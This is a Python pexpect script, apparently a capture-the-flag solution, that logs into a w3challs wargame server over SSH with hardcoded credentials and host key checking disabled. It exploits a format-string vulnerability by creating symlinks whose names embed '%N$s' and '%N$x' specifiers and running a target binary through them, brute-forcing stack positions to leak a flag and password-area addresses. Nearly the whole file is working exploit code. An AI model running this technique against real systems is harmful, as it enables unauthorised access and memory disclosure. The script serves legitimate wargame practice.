#!/usr/bin/env python3

import pexpect

print("💀💀💀 FUERZA BRUTA TOTAL 💀💀💀")

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", timeout=30)
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])
print("[✓] Conectado!")

# Ir a /tmp
child.sendline(b"cd /tmp && rm -f f* 2>/dev/null")
child.expect([b'\\$'])

print("\n[*] Fuerza bruta de TODAS las posiciones...")

found = False
for i in range(1, 500):
    if i % 50 == 0:
        print(f"  Probando posición {i}...")
    
    # Crear symlink con %s
    cmd = f"ln -sf /home/basic9/basic9 'f%{i}$s' 2>/dev/null".encode()
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=1)
    
    # Ejecutar
    cmd = f"timeout 0.2 ./f%{i}$s x 2>&1".encode()
    child.sendline(cmd)
    
    try:
        child.expect([b'\\$', b'W3C'], timeout=1)
        
        if b'W3C' in child.before or b'W3C' in child.after:
            output = child.before + (child.after if child.after else b'')
            print(f"\n🔥🔥🔥 FLAG ENCONTRADA EN POSICIÓN {i} 🔥🔥🔥")
            
            # Decodificar con manejo de errores
            try:
                output_str = output.decode('utf-8', errors='ignore')
            except:
                output_str = output.decode('latin-1', errors='ignore')
            
            # Buscar el patrón
            import re
            match = re.search(r'W3C\{[^}]+\}', output_str)
            if match:
                print(f"\nFLAG: {match.group(0)}\n")
                found = True
                break
            else:
                # Si no encuentra el patrón completo, imprimir lo que hay
                print(f"Output parcial: {output_str[:200]}")
                
                # Intentar obtener más
                cmd = f"./f%{i}$s x 2>&1 | strings | grep W3C".encode()
                child.sendline(cmd)
                child.expect([b'\\$'], timeout=2)
                extra = child.before
                
                try:
                    extra_str = extra.decode('utf-8', errors='ignore')
                    match = re.search(r'W3C\{[^}]+\}', extra_str)
                    if match:
                        print(f"\nFLAG: {match.group(0)}\n")
                        found = True
                        break
                except:
                    pass
    except:
        pass

if not found:
    print("\n[*] Probando con %x para ver el stack...")
    
    for i in range(1, 200):
        cmd = f"ln -sf /home/basic9/basic9 'h%{i}$x' 2>/dev/null".encode()
        child.sendline(cmd)
        child.expect([b'\\$'], timeout=1)
        
        cmd = f"./h%{i}$x x 2>&1 | head -2".encode()
        child.sendline(cmd)
        child.expect([b'\\$'], timeout=1)
        
        output = child.before
        try:
            output_str = output.decode('utf-8', errors='ignore')
            if 'h%' in output_str and len(output_str) > 20:
                lines = output_str.split('\n')
                for line in lines:
                    if 'h%' in line and 'x x' not in line:
                        hex_val = line.replace('h%', '').replace('$x', '').strip()
                        if len(hex_val) == 8:  # Valor hex de 32 bits
                            print(f"Pos {i}: 0x{hex_val}")
                            
                            # Si es 0x0804a060 o cercano, es la dirección de password
                            try:
                                val = int(hex_val, 16)
                                if 0x0804a000 <= val <= 0x0804b000:
                                    print(f"[!] Posible dirección de password: 0x{hex_val}")
                            except:
                                pass
        except:
            pass

child.close()
print("\n💀 FIN 💀")